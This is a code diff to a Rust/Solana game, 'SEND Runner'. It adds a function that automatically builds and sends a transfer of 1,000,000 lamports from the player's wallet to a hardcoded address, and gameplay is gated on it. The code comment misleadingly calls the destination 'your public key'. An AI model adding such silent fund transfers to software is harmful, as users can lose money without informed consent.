@@ -1,6 +1,36 @@
 mod state;
+use solana::{anchor, rpc, solana_sdk};
+use solana_sdk::pubkey::Pubkey;
 use state::*;
+use turbo::solana::{
+    self,
+    solana_sdk::{
+        instruction::{AccountMeta, Instruction},
+        transaction::Transaction,
+    },
+};
+static mut DONE:bool = false;
+//solana config
+fn init() -> bool {
+    let pubkey = solana::signer();
+    // 1. Create the Transaction
+    let receive: Pubkey = "FyLhdnmLKSeWSkPqbxHFDAmCf2LY6cNricTpofGxF4mG"
+        .parse()
+        .unwrap();
+    let lamports_to_send = 1_000_000;
+    // Create the transfer instruction
+    let instruction = solana_sdk::system_instruction::transfer(
+        &pubkey,          // Source public key (signer)
+        &receive,         // Destination public key (your public key)
+        lamports_to_send, // Amount in lamports
+    );
+    let tx = Transaction::new_with_payer(&[instruction], Some(&pubkey));
 
+    // 2. Send the transaction
+    let did_send = solana::rpc::sign_and_send_transaction(&tx);
+    unsafe { DONE = true; };
+    return did_send;
+}
 // Define the game configuration
 turbo::cfg! {r#"
     name = "SEND Runner"
@@ -83,8 +113,11 @@ turbo::go!({
     let mut state = GameState::load();      
     
     let gp = gamepad(0);
-    
-    if !state.is_ready && state.tick >= state.enemy_spawn_rate {
+    if !state.is_ready && state.tick >= state.enemy_spawn_rate && DONE == false && state.processing == false { 
+        init();
+        state.processing = true;
+    }
+    if !state.is_ready && state.tick >= state.enemy_spawn_rate && DONE == true {
         state.is_ready = true;
         state.is_jumping = true;
         state.vel_y = -3.;
